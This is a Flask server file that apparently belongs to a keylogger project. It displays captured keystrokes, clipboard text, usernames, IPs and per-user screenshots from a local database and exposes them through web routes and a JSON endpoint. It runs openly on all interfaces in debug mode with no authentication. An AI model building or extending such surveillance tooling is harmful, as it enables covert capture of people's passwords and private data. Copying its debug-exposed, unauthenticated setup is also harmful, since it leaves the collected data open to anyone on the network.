from flask import Flask, render_template, g, send_from_directory, request, jsonify
import sqlite3
import os

app = Flask(__name__)
DB_FILE = "./db/keylogs.db"
SCREENSHOT_DIR = r"C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData"


def get_db():
    db = getattr(g, "_database", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, "_database", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT DISTINCT username FROM logs")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "SELECT timestamp, username, ip, text, 'keystroke' as type FROM logs ORDER BY timestamp DESC"
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            "timestamp": row[0],
            "username": row[1],
            "ip": row[2],
            "text": row[3],
            "type": row[4],
        }
        for row in logs
    ]


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC"
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            "timestamp": row[0],
            "username": row[1],
            "ip": row[2],
            "text": row[3],
            "type": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        screenshot_dir = os.path.join(user_dir_path, "Screenshot")

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith(".png") or file.endswith(".jpg"):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    screenshots.append(
                        {
                            "username": user_dir,
                            "image_path": screenshot_path,
                            "filename": file,
                        }
                    )
    return screenshots


@app.route("/")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k["timestamp"], reverse=True
    )  # Sort logs by timestamp
    return render_template("index.html", unique_users=unique_users, all_logs=all_logs)


@app.route("/screenshots")
def screenshots():
    unique_users = get_unique_users()
    screenshots = get_screenshot_logs()
    return render_template(
        "screenshot.html", screenshots=screenshots, unique_users=unique_users
    )


@app.route("/screenshots/<path:filename>")
def serve_screenshot(filename):
    return send_from_directory(SCREENSHOT_DIR, filename)


@app.route("/testing")
def testing():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k["timestamp"], reverse=True
    )  # Sort logs by timestamp
    screenshots = get_screenshot_logs()
    return render_template(
        "testing.html",
        screenshots=screenshots,
        unique_users=unique_users,
        all_logs=all_logs,
    )


@app.route("/get_logs", methods=["GET"])
def get_logs():
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k["timestamp"], reverse=True
    )  # Sort logs by timestamp
    return jsonify(all_logs)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
